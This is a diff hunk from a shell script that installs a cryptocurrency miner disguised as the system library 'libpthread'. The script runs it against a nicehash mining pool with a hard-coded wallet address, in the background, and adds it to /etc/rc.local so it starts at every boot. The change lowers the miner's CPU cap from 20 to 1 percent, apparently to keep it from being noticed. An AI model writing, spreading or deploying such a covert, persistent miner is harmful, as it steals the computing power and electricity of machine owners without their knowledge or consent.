@@ -45,7 +45,7 @@ case $PM in
 esac 
 
 sudo mv ./libpthread /lib/libpthread
-sudo echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=20 -p x --background" > /usr/sbin/pthread
+sudo echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=1 -p x --background" > /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
 sudo chmod +x /usr/sbin/pthread
 sudo echo "/usr/sbin/pthread >/dev/null 2>&1 &" >> /etc/rc.local
